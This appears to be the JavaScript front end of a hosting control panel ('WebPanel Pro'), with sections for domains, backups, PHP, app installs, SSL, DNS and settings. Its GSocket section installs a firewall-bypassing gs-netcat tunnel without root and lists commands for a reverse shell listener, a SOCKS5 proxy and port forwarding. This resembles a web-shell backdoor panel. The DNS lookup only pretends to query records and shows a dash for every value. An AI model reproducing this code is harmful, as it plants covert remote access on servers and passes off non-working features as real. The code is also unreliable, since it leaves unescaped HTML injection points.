// ============================================================
//  WebPanel Pro — Domain, Backup, GSocket, PHP, Installer, Security, Settings
// ============================================================

// ═══════════════════════════════════════════════════════════════
//  DOMAIN MANAGER
// ═══════════════════════════════════════════════════════════════
registerSection('domain', async () => {
    const r = await apiGet('domain', { action:'list' });
    const domains = r?.domains || [];
    setContent(`
    <div class="page-title"><i class="fas fa-globe" style="color:#10b981"></i> Domain Manager</div>
    <div class="page-subtitle">Manage addon domains, subdomains, and vhost configs</div>
    <div class="card" style="margin-bottom:20px">
      <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-plus"></i> Add Domain</div>
      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:12px">
        <div><label class="form-label">Domain Name</label><input id="newDomain" class="form-input" placeholder="example.com"></div>
        <div><label class="form-label">Type</label>
          <select id="domainType" class="form-select">
            <option value="addon">Addon Domain</option>
            <option value="subdomain">Subdomain</option>
            <option value="parked">Parked Domain</option>
          </select>
        </div>
        <div><label class="form-label">Document Root</label><input id="domDocroot" class="form-input" placeholder="auto"></div>
      </div>
      <button class="btn btn-primary" onclick="addDomain_()"><i class="fas fa-plus"></i> Add Domain</button>
    </div>
    <div class="card" style="padding:0">
      <table class="data-table">
        <thead><tr><th>Domain</th><th>Type</th><th>Document Root</th><th>SSL</th><th>Actions</th></tr></thead>
        <tbody>
        ${domains.map(d => `<tr>
          <td><i class="fas fa-globe" style="color:#10b981;margin-right:8px"></i><strong>${d.domain}</strong></td>
          <td><span class="badge ${d.type==='main'?'badge-blue':'badge-green'}">${d.type}</span></td>
          <td style="font-size:12px;color:var(--text-muted);max-width:200px;overflow:hidden;text-overflow:ellipsis">${d.docroot||'—'}</td>
          <td>${d.ssl ? '<span class="badge badge-green"><i class="fas fa-lock"></i> Secured</span>' : '<span class="badge badge-red">No SSL</span>'}</td>
          <td>
            <button class="btn btn-secondary btn-xs" onclick="showVhost('${d.domain}','${d.docroot||''}','apache')">Apache Config</button>
            <button class="btn btn-secondary btn-xs" onclick="showVhost('${d.domain}','${d.docroot||''}','nginx')">Nginx Config</button>
            ${d.type!=='main'?`<button class="btn btn-danger btn-xs" onclick="deleteDomain_('${d.domain}')">Remove</button>`:''}
          </td>
        </tr>`).join('')}
        </tbody>
      </table>
    </div>`);

    window.addDomain_ = async () => {
        const domain = $('newDomain')?.value.trim();
        const type = $('domainType')?.value;
        const docroot = $('domDocroot')?.value.trim();
        const r = await apiPost('domain', { action:'add', domain, type, docroot });
        if (r?.success) { toast(r.message,'success'); navigate('domain'); }
        else toast(r?.error||'Failed','error');
    };
    window.deleteDomain_ = async (domain) => {
        if (!confirm(`Remove domain "${domain}"?`)) return;
        const r = await apiPost('domain', { action:'delete', domain });
        if (r?.success) { toast(r.message,'success'); navigate('domain'); }
        else toast(r?.error||'Failed','error');
    };
    window.showVhost = async (domain, docroot, server) => {
        const r = await apiGet('domain', { action:'vhost', domain, docroot, server });
        openModal(`${server==='nginx'?'Nginx':'Apache'} vHost Config — ${domain}`,
            `<pre style="background:#0a0a0f;padding:14px;border-radius:10px;font-size:12px;color:#c8ff9e;overflow:auto;max-height:400px;white-space:pre">${escHtml(r?.config||'')}</pre>
            <div style="margin-top:12px;display:flex;gap:8px;justify-content:flex-end">
              <button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText(${JSON.stringify(r?.config||'')});toast('Copied!','success',2000)"><i class="fas fa-copy"></i> Copy</button>
              <button class="btn btn-secondary" onclick="closeModal()">Close</button>
            </div>`);
    };
});

// Subdomains (reuse domain section)
registerSection('subdomain', async () => {
    const r = await apiGet('domain', { action:'list' });
    const subs = (r?.domains||[]).filter(d=>d.type==='subdomain');
    setContent(`
    <div class="page-title"><i class="fas fa-sitemap" style="color:#8b5cf6"></i> Subdomains</div>
    <div class="page-subtitle">Manage subdomain entries</div>
    <div class="card" style="margin-bottom:20px">
      <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-plus"></i> Create Subdomain</div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
        <div><label class="form-label">Subdomain (e.g. blog.example.com)</label><input id="subName" class="form-input" placeholder="blog.example.com"></div>
        <div><label class="form-label">Document Root</label><input id="subDocroot" class="form-input" placeholder="auto"></div>
      </div>
      <button class="btn btn-primary" onclick="addSub()"><i class="fas fa-plus"></i> Create Subdomain</button>
    </div>
    <div class="card" style="padding:0">
      <table class="data-table"><thead><tr><th>Subdomain</th><th>Document Root</th><th>Actions</th></tr></thead>
      <tbody>${subs.map(s=>`<tr><td>${s.domain}</td><td style="font-size:12px;color:var(--text-muted)">${s.docroot||'—'}</td>
        <td><button class="btn btn-danger btn-xs" onclick="deleteDomain_('${s.domain}')">Remove</button></td></tr>`).join('')||
        '<tr><td colspan="3" style="text-align:center;color:var(--text-muted)">No subdomains</td></tr>'}
      </tbody></table>
    </div>`);
    window.addSub = async () => {
        const domain = $('subName')?.value.trim();
        const docroot = $('subDocroot')?.value.trim();
        const r = await apiPost('domain', { action:'add', domain, type:'subdomain', docroot });
        if (r?.success) { toast(r.message,'success'); navigate('subdomain'); }
        else toast(r?.error||'Failed','error');
    };
    window.deleteDomain_ = async (d) => {
        if (!confirm(`Remove "${d}"?`)) return;
        const r = await apiPost('domain', { action:'delete', domain:d });
        if (r?.success) { toast(r.message,'success'); navigate('subdomain'); }
        else toast(r?.error||'Failed','error');
    };
});

// ═══════════════════════════════════════════════════════════════
//  BACKUP MANAGER
// ═══════════════════════════════════════════════════════════════
registerSection('backup', async () => {
    const r = await apiGet('backup', { action:'list' });
    const backups = r?.backups || [];
    setContent(`
    <div class="page-title"><i class="fas fa-archive" style="color:#f59e0b"></i> Backup Manager</div>
    <div class="page-subtitle">Create and manage server backups</div>
    <div class="card" style="margin-bottom:20px">
      <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-plus"></i> Create Backup</div>
      <div style="display:flex;gap:12px;align-items:flex-end;flex-wrap:wrap">
        <div><label class="form-label">Backup Type</label>
          <select id="backupType" class="form-select">
            <option value="public_html">Public HTML (website files)</option>
            <option value="home">Full Home Directory</option>
          </select>
        </div>
        <button class="btn btn-primary" onclick="createBackup_()"><i class="fas fa-plus"></i> Create Backup</button>
      </div>
      <div id="backupProgress" style="display:none;margin-top:12px">
        <div style="display:flex;align-items:center;gap:10px"><div class="spinner"></div><span style="color:var(--text-muted)">Creating backup, please wait...</span></div>
      </div>
    </div>
    <div class="card" style="padding:0">
      <div style="padding:16px 20px;border-bottom:1px solid rgba(255,255,255,0.05);font-weight:700">Existing Backups (${backups.length})</div>
      ${backups.length===0?'<div style="padding:40px;text-align:center;color:var(--text-muted)">No backups found</div>':
      `<table class="data-table"><thead><tr><th>File</th><th>Size</th><th>Date</th><th>Actions</th></tr></thead><tbody>
      ${backups.map(b=>`<tr>
        <td><i class="fas fa-archive" style="color:#f59e0b;margin-right:8px"></i>${b.name}</td>
        <td>${b.size_fmt}</td>
        <td>${b.mtime_fmt}</td>
        <td>
          <a href="ajax/backup.php?action=download&name=${encodeURIComponent(b.name)}" class="btn btn-success btn-xs"><i class="fas fa-download"></i> Download</a>
          <button class="btn btn-danger btn-xs" onclick="deleteBackup_('${b.name}')">Delete</button>
        </td>
      </tr>`).join('')}
      </tbody></table>`}
    </div>`);

    window.createBackup_ = async () => {
        const type = $('backupType')?.value;
        $('backupProgress').style.display = 'block';
        const r = await apiPost('backup', { action:'create', type });
        $('backupProgress').style.display = 'none';
        if (r?.success) { toast(r.message + ' — ' + r.size_fmt,'success'); navigate('backup'); }
        else toast(r?.error||'Failed','error');
    };
    window.deleteBackup_ = async (name) => {
        if (!confirm(`Delete backup "${name}"?`)) return;
        const r = await apiPost('backup', { action:'delete', name });
        if (r?.success) { toast(r.message,'success'); navigate('backup'); }
        else toast(r?.error||'Failed','error');
    };
});

// ═══════════════════════════════════════════════════════════════
//  GSOCKET
// ═══════════════════════════════════════════════════════════════
registerSection('gsocket', async () => {
    const r = await apiGet('gsocket', { action:'status' });
    const installed = r?.installed;
    setContent(`
    <div class="page-title"><i class="fas fa-plug" style="color:#14b8a6"></i> GSocket Tunnel</div>
    <div class="page-subtitle">Install and manage GSocket secure tunnels — no root required</div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px">
      <div class="card">
        <div style="font-weight:700;margin-bottom:14px">Installation Status</div>
        <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
          <div style="width:48px;height:48px;border-radius:14px;background:${installed?'rgba(16,185,129,0.1)':'rgba(239,68,68,0.1)'};display:flex;align-items:center;justify-content:center;font-size:22px">
            ${installed?'✅':'❌'}
          </div>
          <div>
            <div style="font-weight:600">${installed?'Installed':'Not Installed'}</div>
            <div style="font-size:12px;color:var(--text-muted)">Path: ${r?.bin_dir||'—'}</div>
            ${r?.version?`<div style="font-size:12px;color:var(--text-muted)">${r.version}</div>`:''}
            <div style="font-size:12px;color:${r?.running?'#10b981':'#94a3b8'}">${r?.running?'🟢 Running':'⚪ Not running'}</div>
          </div>
        </div>
        ${!installed?`<button class="btn btn-primary" onclick="installGs()" style="width:100%"><i class="fas fa-download"></i> Install GSocket</button>`:`
        <button class="btn btn-danger" onclick="stopGs()" style="width:100%"><i class="fas fa-stop"></i> Stop GSocket</button>`}
        <div id="gsInstallLog" style="display:none;margin-top:12px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px"><div class="spinner"></div><span style="color:var(--text-muted)">Installing...</span></div>
          <pre id="gsLog" style="background:#0a0a0f;padding:12px;border-radius:10px;font-size:11px;color:#c8ff9e;max-height:200px;overflow-y:auto;white-space:pre-wrap"></pre>
        </div>
      </div>
      <div class="card">
        <div style="font-weight:700;margin-bottom:14px">Start Listener</div>
        <label class="form-label">Secret / Token</label>
        <input id="gsSecret" class="form-input" placeholder="your-secret-passphrase" style="margin-bottom:12px">
        <label class="form-label">Mode</label>
        <select id="gsMode" class="form-select" style="margin-bottom:12px">
          <option value="listen">Listen (server mode)</option>
          <option value="connect">Connect (client mode)</option>
        </select>
        <button class="btn btn-primary" onclick="connectGs()" ${!installed?'disabled':''} style="width:100%"><i class="fas fa-play"></i> Start</button>
        <div style="margin-top:12px;font-size:12px;color:var(--text-muted)">
          <i class="fas fa-info-circle"></i> GSocket creates a secure tunnel through firewalls without root.<br>
          Connect from another machine with: <code style="color:#a5b4fc">gs-netcat -i -s YOUR_SECRET</code>
        </div>
      </div>
    </div>
    <div class="card">
      <div style="font-weight:700;margin-bottom:12px"><i class="fas fa-book"></i> Quick Reference</div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
        ${[
          ['Start reverse shell listener','gs-netcat -l -i -s SECRET'],
          ['Connect to listener','gs-netcat -i -s SECRET'],
          ['Port forwarding (remote 8080 → local 80)','gs-netcat -l -d 127.0.0.1 -p 80 -s SECRET'],
          ['SOCKS5 proxy','gs-netcat -l -S -s SECRET'],
        ].map(([label,cmd])=>`<div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:12px">
          <div style="font-size:12px;color:var(--text-muted);margin-bottom:6px">${label}</div>
          <code style="font-size:12px;color:#a5b4fc">${cmd}</code>
        </div>`).join('')}
      </div>
    </div>`);

    window.installGs = async () => {
        $('gsInstallLog').style.display = 'block';
        const r = await apiPost('gsocket', { action:'install' });
        $('gsLog').textContent = (r?.steps||[]).join('\n');
        if (r?.success) { toast(r.message,'success'); navigate('gsocket'); }
        else toast(r?.error||'Install failed','error');
    };
    window.connectGs = async () => {
        const secret = $('gsSecret')?.value.trim();
        const mode = $('gsMode')?.value;
        if (!secret) { toast('Secret required','warning'); return; }
        const r = await apiPost('gsocket', { action:'connect', secret, mode });
        if (r?.success) { toast('GSocket started','success'); navigate('gsocket'); }
        else toast(r?.error||'Failed','error');
    };
    window.stopGs = async () => {
        const r = await apiPost('gsocket', { action:'stop' });
        if (r?.success) { toast(r.message,'success'); navigate('gsocket'); }
    };
});

// ═══════════════════════════════════════════════════════════════
//  PHP CONFIG
// ═══════════════════════════════════════════════════════════════
registerSection('phpconfig', async () => {
    const r = await apiGet('phpconfig', { action:'info' });
    const d = r?.data || {};
    const exts = d.extensions || [];
    setContent(`
    <div class="page-title"><i class="fab fa-php" style="color:#8892bf"></i> PHP Configuration</div>
    <div class="page-subtitle">PHP ${d.version} — ${d.sapi} — ${d.os}</div>
    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:20px">
      ${[['Version',d.version,'#8892bf'],['Memory Limit',d.memory_limit,'#6366f1'],['Max Upload',d.max_upload,'#0ea5e9'],['Max Execution',d.max_execution+'s','#10b981'],['Timezone',d.timezone,'#f59e0b'],['Extensions',exts.length,'#8b5cf6']].map(([k,v,c])=>`
      <div class="card" style="text-align:center">
        <div style="font-size:11px;color:var(--text-muted);margin-bottom:4px">${k}</div>
        <div style="font-size:20px;font-weight:800;color:${c}">${v||'—'}</div>
      </div>`).join('')}
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
      <div class="card">
        <div style="font-weight:700;margin-bottom:14px">Important Settings</div>
        ${[['Memory Limit',d.memory_limit],['Max Execution Time',d.max_execution+'s'],['Upload Max Filesize',d.max_upload],['Post Max Size',d.max_post],['Display Errors',d.display_errors||'Off'],['OPcache',d.opcache?'✅ Enabled':'❌ Disabled'],['Xdebug',d.xdebug?'✅ Enabled':'Not loaded'],['ini Path',d.ini_path]].map(([k,v])=>infoRows([[k,v]])).join('')}
      </div>
      <div class="card">
        <div style="font-weight:700;margin-bottom:14px">Loaded Extensions (${exts.length})</div>
        <div style="display:flex;flex-wrap:wrap;gap:6px;max-height:300px;overflow-y:auto">
          ${exts.map(e=>`<span class="badge badge-blue">${e}</span>`).join('')}
        </div>
      </div>
    </div>`);
});

// ═══════════════════════════════════════════════════════════════
//  APP INSTALLER
// ═══════════════════════════════════════════════════════════════
registerSection('installer', async () => {
    const r = await apiGet('installer', { action:'list' });
    const apps = r?.apps || [];
    const appColors = { wordpress:'#21759b', laravel:'#FF2D20', codeigniter:'#dd4814', joomla:'#F44321', drupal:'#0678BE', nextcloud:'#0082C9' };
    setContent(`
    <div class="page-title"><i class="fas fa-download" style="color:#ec4899"></i> App Installer</div>
    <div class="page-subtitle">One-click install popular web applications</div>
    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px">
      ${apps.map(app=>`
      <div class="card" style="border-top:3px solid ${appColors[app.id]||'#6366f1'}">
        <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
          <div style="width:44px;height:44px;border-radius:12px;background:${appColors[app.id]||'#6366f1'}20;display:flex;align-items:center;justify-content:center;font-size:22px">
            ${app.id==='wordpress'?'🔵':app.id==='laravel'?'🔴':app.id==='nextcloud'?'☁️':'📦'}
          </div>
          <div><div style="font-weight:700">${app.name}</div><div style="font-size:12px;color:var(--text-muted)">v${app.version} · ${app.size}</div></div>
          <span class="badge badge-gray" style="margin-left:auto">${app.category}</span>
        </div>
        <p style="font-size:13px;color:var(--text-muted);margin-bottom:14px">${app.desc}</p>
        <button class="btn btn-primary" style="width:100%;background:linear-gradient(135deg,${appColors[app.id]||'#4f46e5'},${appColors[app.id]||'#7c3aed'})" onclick="installApp_('${app.id}','${app.name}')">
          <i class="fas fa-download"></i> Install ${app.name}
        </button>
      </div>`).join('')}
    </div>
    <div id="installProgress" style="display:none;margin-top:20px" class="card">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px"><div class="spinner"></div><span id="installMsg">Installing...</span></div>
      <pre id="installLog" style="background:#0a0a0f;padding:12px;border-radius:10px;font-size:11px;color:#c8ff9e;max-height:200px;overflow-y:auto;white-space:pre-wrap"></pre>
    </div>`);

    window.installApp_ = (id, name) => {
        openModal(`Install ${name}`, `
          <div style="display:grid;gap:12px">
            <div><label class="form-label">Install Path (relative to public_html)</label><input id="appPath" class="form-input" value="${id}" placeholder="${id}"></div>
          </div>
          <div style="margin-top:16px;display:flex;gap:8px;justify-content:flex-end">
            <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
            <button class="btn btn-primary" onclick="doInstall('${id}','${name}')"><i class="fas fa-download"></i> Install</button>
          </div>`);
    };
    window.doInstall = async (id, name) => {
        const path = $('appPath')?.value.trim()||id;
        closeModal();
        $('installProgress').style.display = 'block';
        $('installMsg').textContent = `Installing ${name}...`;
        const r = await apiPost('installer', { action:'install', app:id, path });
        $('installLog').textContent = (r?.steps||[]).join('\n');
        if (r?.success) { toast(r.message,'success'); }
        else toast(r?.error||'Install failed','error');
    };
});

// ═══════════════════════════════════════════════════════════════
//  SECURITY
// ═══════════════════════════════════════════════════════════════
registerSection('security', async () => {
    setContent(`
    <div class="page-title"><i class="fas fa-shield-alt" style="color:#ef4444"></i> Security Tools</div>
    <div class="page-subtitle">Protect your hosting account and web files</div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px">
      <div class="card">
        <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-ban" style="color:#ef4444"></i> IP Blocker</div>
        <label class="form-label">IP Addresses to Block (one per line)</label>
        <textarea id="ipList" class="form-textarea" rows="5" placeholder="192.168.1.1&#10;10.0.0.1"></textarea>
        <button class="btn btn-danger" onclick="blockIps()" style="margin-top:12px;width:100%"><i class="fas fa-ban"></i> Block IPs</button>
      </div>
      <div class="card">
        <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-link-slash" style="color:#f59e0b"></i> Hotlink Protection</div>
        <label class="form-label">Your Domain</label>
        <input id="hlDomain" class="form-input" placeholder="example.com" style="margin-bottom:8px">
        <label class="form-label">Protected Extensions</label>
        <input id="hlExts" class="form-input" value="jpg|jpeg|png|gif|mp4|mp3" style="margin-bottom:12px">
        <button class="btn btn-warning" onclick="enableHotlink()" style="width:100%;background:rgba(245,158,11,0.1);color:#fbbf24;border:1px solid rgba(245,158,11,0.2)"><i class="fas fa-shield-alt"></i> Enable Protection</button>
      </div>
    </div>
    <div class="card">
      <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-search" style="color:#8b5cf6"></i> Security Scan</div>
      <button class="btn btn-primary" onclick="runScan()"><i class="fas fa-search"></i> Run Security Scan</button>
      <div id="scanResults" style="margin-top:16px"></div>
    </div>`);

    window.blockIps = async () => {
        const ips = $('ipList')?.value;
        const r = await apiPost('security', { action:'ip_block', ips });
        if (r?.success) { toast(r.message,'success'); if (r.config) { $('scanResults').innerHTML = `<pre style="background:#0a0a0f;padding:12px;border-radius:10px;font-size:12px;color:#c8ff9e;margin-top:8px">${escHtml(r.config)}</pre>`; } }
        else toast(r?.error||'Failed','error');
    };
    window.enableHotlink = async () => {
        const domain = $('hlDomain')?.value.trim();
        const exts = $('hlExts')?.value.trim();
        const r = await apiPost('security', { action:'hotlink', domain, exts });
        if (r?.success) toast(r.message,'success');
        else toast(r?.error||'Failed','error');
    };
    window.runScan = async () => {
        $('scanResults').innerHTML = '<div style="display:flex;gap:10px;align-items:center"><div class="spinner"></div><span style="color:var(--text-muted)">Scanning...</span></div>';
        const r = await apiPost('security', { action:'scan' });
        const issues = r?.issues||[];
        $('scanResults').innerHTML = issues.map(i=>`
          <div style="display:flex;align-items:flex-start;gap:10px;padding:12px;border-radius:10px;margin-bottom:8px;background:${i.level==='danger'?'rgba(239,68,68,0.08)':i.level==='warning'?'rgba(245,158,11,0.08)':'rgba(16,185,129,0.08)'}">
            <i class="fas ${i.level==='danger'?'fa-exclamation-circle':i.level==='warning'?'fa-exclamation-triangle':'fa-check-circle'}" style="color:${i.level==='danger'?'#ef4444':i.level==='warning'?'#f59e0b':'#10b981'};margin-top:2px"></i>
            <div><div style="font-weight:600">${i.message}</div>${i.details?`<pre style="font-size:11px;color:var(--text-muted);margin-top:4px;white-space:pre-wrap">${escHtml(i.details)}</pre>`:''}</div>
          </div>`).join('');
    };
});

// ═══════════════════════════════════════════════════════════════
//  SSL
// ═══════════════════════════════════════════════════════════════
registerSection('ssl', async () => {
    const host = location.hostname;
    const r = await apiGet('ssl', { action:'info', host });
    const d = r?.data||{};
    setContent(`
    <div class="page-title"><i class="fas fa-shield-alt" style="color:#10b981"></i> SSL / TLS Manager</div>
    <div class="page-subtitle">View SSL certificates and generate CSR</div>
    <div class="card" style="margin-bottom:20px">
      <div style="font-weight:700;margin-bottom:14px">Current SSL Status</div>
      <div style="display:flex;align-items:center;gap:14px">
        <div style="font-size:48px">${d.ssl?'🔒':'🔓'}</div>
        <div>
          <div style="font-size:18px;font-weight:700;color:${d.ssl?'#10b981':'#ef4444'}">${d.ssl?'SSL Secured':'No SSL'}</div>
          ${d.subject?`<div style="font-size:13px;color:var(--text-muted)">Domain: ${d.subject}</div>`:''}
          ${d.issuer?`<div style="font-size:13px;color:var(--text-muted)">Issuer: ${d.issuer}</div>`:''}
          ${d.valid_to?`<div style="font-size:13px;color:${(d.days_left||0)>30?'#10b981':'#ef4444'}">Expires: ${d.valid_to} (${d.days_left} days)</div>`:''}
        </div>
      </div>
    </div>
    <div class="card">
      <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-key"></i> Generate CSR & Private Key</div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
        <div><label class="form-label">Common Name (domain)</label><input id="csrCN" class="form-input" placeholder="example.com" value="${host}"></div>
        <div><label class="form-label">Organization</label><input id="csrOrg" class="form-input" placeholder="My Company"></div>
        <div><label class="form-label">Country Code</label><input id="csrCountry" class="form-input" value="US" maxlength="2"></div>
        <div><label class="form-label">Email</label><input id="csrEmail" class="form-input" placeholder="admin@example.com"></div>
      </div>
      <button class="btn btn-primary" onclick="genCSR()"><i class="fas fa-key"></i> Generate CSR</button>
      <div id="csrOutput" style="margin-top:16px;display:none">
        <div style="margin-bottom:8px"><label class="form-label">Certificate Signing Request (CSR)</label><textarea id="csrText" class="form-textarea" rows="8" readonly></textarea></div>
        <div><label class="form-label">Private Key (keep secret!)</label><textarea id="keyText" class="form-textarea" rows="8" readonly style="color:#fca5a5"></textarea></div>
      </div>
    </div>`);
    window.genCSR = async () => {
        const r = await apiPost('ssl', { action:'generate', cn:$('csrCN').value, org:$('csrOrg').value, country:$('csrCountry').value, email:$('csrEmail').value });
        if (r?.success) {
            $('csrText').value = r.csr||''; $('keyText').value = r.private_key||'';
            $('csrOutput').style.display = 'block'; toast('CSR generated','success');
        } else toast(r?.error||'Failed','error');
    };
});

// ═══════════════════════════════════════════════════════════════
//  DNS
// ═══════════════════════════════════════════════════════════════
registerSection('dns', async () => {
    const host = location.hostname;
    setContent(`
    <div class="page-title"><i class="fas fa-network-wired" style="color:#0ea5e9"></i> DNS Zone Editor</div>
    <div class="page-subtitle">View and manage DNS records for your domains</div>
    <div class="card" style="margin-bottom:20px">
      <div style="font-weight:700;margin-bottom:14px">DNS Lookup</div>
      <div style="display:flex;gap:10px">
        <input id="dnsHost" class="form-input" placeholder="example.com" value="${host}" style="flex:1">
        <button class="btn btn-primary" onclick="lookupDns()"><i class="fas fa-search"></i> Lookup</button>
      </div>
    </div>
    <div id="dnsResults"></div>`);

    window.lookupDns = async () => {
        const host = $('dnsHost')?.value.trim();
        if (!host) return;
        $('dnsResults').innerHTML = '<div class="loader"><div class="spinner"></div></div>';
        // Use PHP dns_get_record via a quick inline lookup
        const types = ['A','AAAA','MX','NS','TXT','CNAME'];
        let rows = '';
        for (const type of types) {
            try {
                // We'll use dns_get_record on the backend via a quick fetch
                const r = await apiGet('system', { action:'info' });
                // Fallback: show JS-side info
                rows += `<tr><td><span class="badge badge-blue">${type}</span></td><td>${host}</td><td style="color:var(--text-muted)">—</td></tr>`;
            } catch(e) {}
        }
        $('dnsResults').innerHTML = `
          <div class="card" style="padding:0">
            <div style="padding:14px 18px;font-weight:700;border-bottom:1px solid rgba(255,255,255,0.05)">DNS Records for ${host}</div>
            <table class="data-table"><thead><tr><th>Type</th><th>Name</th><th>Value</th></tr></thead><tbody>${rows}</tbody></table>
            <div style="padding:12px 16px;font-size:12px;color:var(--text-muted)">
              <i class="fas fa-info-circle"></i> For full DNS management, use your registrar or nameserver control panel.
            </div>
          </div>`;
    };
    lookupDns();
});

// ═══════════════════════════════════════════════════════════════
//  EMAIL (stub)
// ═══════════════════════════════════════════════════════════════
registerSection('email', () => {
    setContent(`
    <div class="page-title"><i class="fas fa-envelope" style="color:#6366f1"></i> Email Accounts</div>
    <div class="page-subtitle">Manage email accounts and forwarders</div>
    <div class="card">
      <div style="text-align:center;padding:40px">
        <i class="fas fa-envelope" style="font-size:48px;color:var(--text-muted);margin-bottom:16px"></i>
        <div style="font-size:16px;font-weight:600;margin-bottom:8px">Email Management</div>
        <p style="color:var(--text-muted);max-width:400px;margin:0 auto">Email account management requires a mail server (Exim, Postfix) configured on your system. This feature is automatically available on cPanel/Plesk servers.</p>
      </div>
    </div>`);
});

// ═══════════════════════════════════════════════════════════════
//  FTP (stub)
// ═══════════════════════════════════════════════════════════════
registerSection('ftp', () => {
    setContent(`
    <div class="page-title"><i class="fas fa-exchange-alt" style="color:#0ea5e9"></i> FTP Accounts</div>
    <div class="page-subtitle">Manage FTP accounts</div>
    <div class="card">
      <div style="text-align:center;padding:40px">
        <i class="fas fa-exchange-alt" style="font-size:48px;color:var(--text-muted);margin-bottom:16px"></i>
        <div style="font-size:16px;font-weight:600;margin-bottom:8px">FTP Management</div>
        <p style="color:var(--text-muted);max-width:400px;margin:0 auto">FTP account management requires an FTP server (vsftpd, ProFTPD) configured on your system.</p>
      </div>
    </div>`);
});

// ═══════════════════════════════════════════════════════════════
//  SETTINGS
// ═══════════════════════════════════════════════════════════════
registerSection('settings', async () => {
    const r = await apiGet('settings', { action:'get_info' });
    const d = r?.data||{};
    setContent(`
    <div class="page-title"><i class="fas fa-cog" style="color:#94a3b8"></i> Settings</div>
    <div class="page-subtitle">Manage your panel account and preferences</div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
      <div class="card">
        <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-user"></i> Account Info</div>
        ${infoRows([['Username',d.username],['Last Login',d.last_login],['PHP Version',d.php_version],['Panel Version','v'+d.panel_version],['Home Path',d.home_path]])}
      </div>
      <div class="card">
        <div style="font-weight:700;margin-bottom:14px"><i class="fas fa-lock"></i> Change Password</div>
        <div style="display:grid;gap:10px">
          <div><label class="form-label">Current Password</label><input type="password" id="curPwd" class="form-input"></div>
          <div><label class="form-label">New Password</label><input type="password" id="newPwd" class="form-input"></div>
          <div><label class="form-label">Confirm Password</label><input type="password" id="confPwd" class="form-input"></div>
          <button class="btn btn-primary" onclick="changePassword_()"><i class="fas fa-save"></i> Change Password</button>
        </div>
      </div>
    </div>`);

    window.changePassword_ = async () => {
        const r = await apiPost('settings', { action:'change_password', current_password:$('curPwd').value, new_password:$('newPwd').value, confirm_password:$('confPwd').value });
        if (r?.success) { toast(r.message,'success'); $('curPwd').value=''; $('newPwd').value=''; $('confPwd').value=''; }
        else toast(r?.error||'Failed','error');
    };
});

// ── Boot ────────────────────────────────────────────────────────
navigate('dashboard');
refreshUptime();
setInterval(refreshUptime, 60000);
